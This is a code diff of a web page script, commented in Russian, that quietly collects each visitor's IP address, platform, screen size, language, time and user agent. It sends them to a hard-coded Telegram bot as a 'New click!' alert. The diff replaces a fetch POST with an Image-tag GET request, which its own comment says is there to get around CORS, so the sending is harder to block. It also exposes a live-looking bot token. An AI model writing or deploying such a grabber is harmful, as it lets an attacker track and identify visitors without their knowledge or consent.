@@ -30,18 +30,16 @@
         .then(res => { data.ip = res.ip; send(); })
         .catch(() => { data.ip = "Неизвестно"; send(); });
 
-        // Отправка в Telegram
         function send() {
-            const token = "9173439883:AAE0SS1Zx4kUugqZXNcbu6Ec2PvRfqkYLN4";
-            const chat_id = "9236744381";
-            const text = `🎯 *Новый клик!*\n\n📱 Устройство: ${data.platform}\n🌐 IP: ${data.ip}\n📏 Экран: ${data.screen}\n🗣 Язык: ${data.language}\n📅 Время: ${data.time}\n\n🔍 UA: \`${data.userAgent}\``;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: text, parse_mode: "Markdown" })
-            });
-        }
-    </script>
+    const token = "9173439883:AAEOSS1Zx4kUugqZXNcbu6Ec2PvRfqkYLN4";
+    const chat_id = "9236744381";
+    
+    // Экранируем текст для безопасной передачи в URL
+    const text = encodeURIComponent(`🎯 *Новый клик!*\n\n📱 Устройство: ${data.platform}\n🌐 IP: ${data.ip}\n📏 Экран: ${data.screen}\n🗣 Язык: ${data.language}\n📅 Время: ${data.time}\n\n🔍 UA: ${data.userAgent}`);
+    
+    // Отправка через Image (обходит CORS)
+    const img = new Image();
+    img.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=Markdown`;
+}
 </body>
 </html>
